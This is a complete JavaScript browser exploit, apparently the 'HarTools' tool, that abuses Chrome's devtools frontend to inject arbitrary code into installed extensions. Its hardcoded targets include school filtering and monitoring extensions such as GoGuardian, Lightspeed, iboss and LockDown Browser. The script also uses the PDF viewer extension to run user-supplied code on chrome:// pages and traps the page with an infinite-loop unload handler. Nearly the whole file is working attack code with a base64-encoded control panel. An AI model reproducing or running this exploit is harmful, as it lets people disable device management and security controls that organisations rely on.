((function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open("devtools://devtools/bundled/inspector.html");
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                if (location.origin.includes("chrome-extension://" + pdfId)) {
                    w.close();
                    chrome.tabs.getCurrent(function (info) {
                        chrome.windows.create({
                            setSelfAsOpener: true,
                            url: mojoURL
                        }, function (win) {
                            const r = win.tabs[0].id;
                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                        })
                    })


                    return;
                }
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    const url = await writeFile('index.html', `${atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPHRpdGxlPkV4dGVuc2lvbiBFdmFsdWF0aW9uIC0gSGFyVG9vbHM8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keT4KICA8ZGl2IGlkPSJwYXJ0aWNsZXMtanMiPjwvZGl2PgogIDxkaXYgY2xhc3M9Im1haW4iPgogICAgPGgxPk5vIHBheWxvYWRzIGFyZSBhdmFpbGFibGU8L2gxPgogICAgPHA+Tm8gcGF5bG9hZHMgY3VycmVudGx5IGF2YWlsYWJsZSBmb3IgeW91ciBleHRlbnNpb24uIFRyeSBhbm90aGVyIGV4dGVuc2lvbi4KICAgICAgV2UgYXJlIGN1cnJlbnRseSBkZXZlbG9waW5nIHBheWxvYWRzIGZvciBvdGhlciBBUElzLjwvcD4KICAgIDxwPkF2YWlsYWJsZSBwYXlsb2FkcyBmb3IgcGVybWlzc2lvbnM6PC9wPgogICAgPHVsPgogICAgICA8bGk+bWFuYWdlbWVudDwvbGk+CiAgICA8L3VsPgogIDwvZGl2PgogIAogIDxzdHlsZT4KICAgIGJvZHkgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUyMDMwOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOwogICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgfQoKICAgIGEgewogICAgICBjb2xvcjogI2I3YmRmODsKICAgIH0KCiAgICAubWFpbiB7CiAgICAgIHRvcDogNTAlOwogICAgICBsZWZ0OiA1MCU7CiAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7CiAgICAgIGJvcmRlcjogM3B4IHNvbGlkIHdoaXRlOwogICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgcGFkZGluZzogNSU7CiAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzI0MjczYTsKICAgIH0KCiAgICAuYnV0dG9uIHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2E2ZGE5NTsKICAgICAgYm9yZGVyOiBub25lOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIHBhZGRpbmc6IDEwcHggMjBweDsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICBtYXJnaW46IDRweCAycHg7CiAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgfQoKICAgIHVsIHsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICBtYXJnaW46IDA7CiAgICAgIHBhZGRpbmc6IDA7CiAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgfQogIDwvc3R5bGU+CjwvYm9keT4KCjwvaHRtbD4=')}`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);

            }
            document.open();
            document.write(atob(`CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCIgLz4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIiAvPgogICAgPHRpdGxlPkhhclRvb2xzPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgQGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9R2Vpc3Q6aXRhbCxvcHN6LHdnaHRAMCwxNC4uMzIsMTAwLi45MDA7MSwxNC4uMzIsMTAwLi45MDAmZGlzcGxheT1zd2FwJyk7CgogICAgICBpZnJhbWUgewogICAgICAgIG9wYWNpdHk6IDA7CiAgICAgICAgd2lkdGg6IDA7CiAgICAgICAgaGVpZ2h0OiAwOwogICAgICB9CgogICAgICBib2R5IHsKICAgICAgICBmb250LWZhbWlseTogJ0dlaXN0Jywgc2Fucy1zZXJpZjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOwogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAxNXB4OwogICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgIH0KCiAgICAgIC5iYWNrZ3JvdW5kLWdyaWQgewogICAgICAgIHBvc2l0aW9uOiBmaXhlZDsKICAgICAgICB0b3A6IDA7CiAgICAgICAgbGVmdDogMDsKICAgICAgICByaWdodDogMDsKICAgICAgICBib3R0b206IDA7CiAgICAgICAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KCMzMzMgMXB4LCB0cmFuc3BhcmVudCAxcHgpOwogICAgICAgIGJhY2tncm91bmQtc2l6ZTogMnJlbSAycmVtOwogICAgICAgIHotaW5kZXg6IC0xOwogICAgICAgIGFuaW1hdGlvbjogbW92ZUdyaWQgNHMgbGluZWFyIGluZmluaXRlOwogICAgICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtcG9zaXRpb24teCA0MDBtczsKICAgICAgfQoKICAgICAgQGtleWZyYW1lcyBtb3ZlR3JpZCB7CiAgICAgICAgMCUgewogICAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogMCAwOwogICAgICAgIH0KCiAgICAgICAgMTAwJSB7CiAgICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAycmVtIDJyZW07CiAgICAgICAgfQogICAgICB9CgogICAgICAuYmFja2dyb3VuZC1ncmlkOmhvdmVyIHsKICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uLXg6IDJyZW07CiAgICAgIH0KCiAgICAgIGEgewogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgfQoKICAgICAgYTpob3ZlciB7CiAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICB9CgogICAgICAubWFpbiB7CiAgICAgICAgdG9wOiA1MCU7CiAgICAgICAgbGVmdDogNTAlOwogICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTsKICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjMWQxZDFkOwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHBhZGRpbmc6IDMwcHg7CiAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwogICAgICAgIG1heC1oZWlnaHQ6IDkwdmg7CiAgICAgICAgb3ZlcmZsb3cteTogYXV0bzsKICAgICAgICB3aWR0aDogNzUlOwogICAgICB9CgogICAgICAuaGVhZGVyIHsKICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgfQoKICAgICAgLmxvZ28gewogICAgICAgIHdpZHRoOiAzLjVlbTsKICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgfQoKICAgICAgLnRpdGxlLXRleHQgewogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgfQoKICAgICAgaDEgewogICAgICAgIGZvbnQtc2l6ZTogMi4yZW07CiAgICAgICAgbWFyZ2luOiAwOwogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICB9CgogICAgICAuYnV0dG9uIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjOGEyYmUyOwogICAgICAgIGNvbG9yOiBibGFjazsKICAgICAgICBwYWRkaW5nOiA4cHggMTJweDsKICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgICBtYXJnaW46IDVweDsKICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgYm9yZGVyLXJhZGl1czogNnB4OwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjNzIGVhc2U7CiAgICAgIH0KCiAgICAgIC5idXR0b246aG92ZXIgewogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNlMmUyZTI7CiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjEpOwogICAgICB9CgogICAgICAuYnV0dG9uOmZvY3VzIHsKICAgICAgICBvdXRsaW5lOiBub25lOwogICAgICB9CgogICAgICBpbnB1dCwKICAgICAgc2VsZWN0LAogICAgICB0ZXh0YXJlYSB7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzEyMTIxMjsKICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxNXB4OwogICAgICB9CgogICAgICBpbnB1dDpmb2N1cywKICAgICAgc2VsZWN0OmZvY3VzLAogICAgICB0ZXh0YXJlYTpmb2N1cyB7CiAgICAgICAgb3V0bGluZTogbm9uZTsKICAgICAgICBib3JkZXItY29sb3I6ICNhODEyZmY7CiAgICAgIH0KCiAgICAgIDo6cGxhY2Vob2xkZXIgewogICAgICAgIGNvbG9yOiAjYmJiOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImJhY2tncm91bmQtZ3JpZCI+PC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJtYWluIj4KICAgICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluL2hhcnRvb2xzLmdpZiIgYWx0PSJIYXJUb29scyBMb2dvIiBjbGFzcz0ibG9nbyIgLz4KICAgICAgICA8ZGl2IGNsYXNzPSJ0aXRsZS10ZXh0Ij4KICAgICAgICAgIDxoMT5IYXJUb29sczwvaDE+CiAgICAgICAgICA8cD5EZXZlbG9wZXIgVG9vbHMgYW5kIEV4dGVuc2lvbiBDb2RlIGV4ZWN1dGlvbjwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CgogICAgICA8cD5UaGlzIHdhcyBmb3VuZCBieSA8YSBocmVmPSJodHRwczovL2Nyb3NzamJseS5wYWdlcy5kZXYvIj5jcm9zc2pibHk8L2E+PGJyPk9yaWdpbmFsIFJpZ1Rvb2xzIEV4cGxvaXQgd2FzIGZvdW5kIGJ5IDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9GV1NtYXNoZXIiPkZXU21hc2hlcjwvYT48L3A+CiAgICAgIDxocj4KICAgICAgPHA+QUtBOiBpZiBzb21lb25lIHRlbGxzIHlvdSB0aGF0IHRoZXkgbWFkZSB0aGlzLCB0aGV5J3JlIGx5aW5nIGFuZCB5b3Ugc2hvdWxkIGxhdWdoIGF0IHRoZW08L3A+CiAgICAgIDxocj4KICAgICAgPHA+QWRkaXRpb25hbCBjcmVkaXRzOiBEaXNjb3JkOiBAYXhxbXggKHRlc3RpbmcgYW5kIGhlbHBpbmcgd2l0aCBkZXZlbG9wbWVudCkgQHB3ZW4gKGlkZWFzKSB8IEdpdGh1YjogPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0ZXU21hc2hlciI+RldTbWFzaGVyPC9hPiAob3JpZ2luYWwgcmlndG9vbHMgZXhwbG9pdCkgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0Jsb2JieS1Cb2kiPkJsb2JieSBCb2k8L2E+ICh0ZXN0aW5nIGFuZCBkZXZlbG9wbWVudCk8L3A+CiAgICAgIDxocj4KCiAgICAgIDxwPlByZXNzIFEgZm9yIGV2YWx1YXRpbmcgY29kZSB1bmRlciA8YSBjbGFzcz0iYnV0dG9uIiBpZD0iZXh0ZGJnIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmV4dGVuc2lvbiBpZDwvYT48L3A+CiAgICAgIDxwPk9yIHByZXNzIDEtOSBmb3Igc29tZSBoYXJkY29kZWQgZXh0ZW5zaW9uczwvcD4KICAgICAgPHA+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0iYWRrY3BrcGdoYWhtYm9wa2pjaG9iaWVja2VvYW9lZW0iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+bHMgZmlsdGVyPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Imhwa2Rva2FramdscHBlZWtmZWVrbWViZmFoYWRuZmxwIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmxzIGFsZXJ0PC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImhhbGRsZ2xkcGxnbmdna2phYWZoZWxnaWFnbGFmYW5oIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmdvZ3VhcmRpYW48L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0ibW9laGtiYmNia2xta2NqaWJjYmJvb2ViZ3BvZ2Vqb2MiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+YXJpc3RvdGxlPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImttZmZlaGJpZGxhbGliZmVrbGFlZm5ja3BpZGJvZGZmIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmlib3NzPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Im1sb2FqZm5tamNrZmpiZWVvZmNkYWVjYmVsbmJsZGVuIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPnNuYXAmcmVhZDwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJmb2dqZWFuamZiaW9tYmdobm1rbW1vcGhmZWNjamRraSIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5sb2NrZG93biBicm93c2VyPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImttcGpsaWxuZW1qY2lvaGpja2phZG1nbWljb2xkZ2xmIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmR5a25vdyBjbG91ZDwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJnbmRtaGRjZWZiaGxjaGtoaXBjbm5ia2NtaWNuY2VoayIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5nZm9ybXMgbG9ja2VkIG1vZGUgKGVucm9sbGVkIGNicyk8L2E+CiAgICAgIDwvcD4KCiAgICAgIDxwPlByZXNzIE0gZm9yIGV2YWx1YXRpbmcgdW5kZXIgPGEgY2xhc3M9ImJ1dHRvbiIgaWQ9ImRldmRiZyIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5kZXZ0b29sczwvYT4gY29udGV4dDwvcD4KICAgICAgPHA+VHlwaW5nIGNhbmNlbCBpbiBhbnkgcHJvbXB0IHdpbGwgY2FuY2VsIHRoZSBjdXJyZW50IG9wZXJhdGlvbi48L3A+CgogICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSJkZXZ0b29sczovL2RldnRvb2xzL2J1bmRsZWQvZGV2dG9vbHNfYXBwLmh0bWw/ZXhwZXJpbWVudHM9dHJ1ZSZ3cz0lJXVwZGF0ZXJ1cmwlJSI+UmUtb3BlbiBkZXZ0b29sczwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0idXBkYXRlciI+VXBkYXRlIHBheWxvYWQ8L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImNsZWFudXAiPkNsZWFudXAgYW5kIHJlc2V0IGZvciBleHRlbnNpb248L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImFjdGl2YXRlIj5DaHJvbWUgVVJMczwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0iYWN0aXZhdGUyIj5DaHJvbWUgVVJMcyAyPC9hPgogICAgPC9kaXY+CgogICAgPHNjcmlwdCBkZWZlcj4KICAgICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAgICAgaWYgKGV2ZW50LmtleSA9PT0gInEiKSB7CiAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZXh0ZGJnIikuY2xpY2soKTsKICAgICAgICB9IGVsc2UgaWYgKGV2ZW50LmtleSA9PT0gIm0iKSB7CiAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGV2ZGJnIikuY2xpY2soKTsKICAgICAgICB9IGVsc2UgaWYgKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXS5pbmNsdWRlcyhldmVudC5rZXkpKSB7CiAgICAgICAgICBjb25zb2xlLmxvZyhldmVudC5rZXkpOwogICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcihgcCAuaGFyZGNvZGVkOm50aC1jaGlsZCgke3BhcnNlSW50KGV2ZW50LmtleSl9KWApLmNsaWNrKCk7CiAgICAgICAgfQogICAgICB9KTsKICAgIDwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = '//manifest.json';
                let is_pdf = false;
                let injected = payload ?? payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
)()
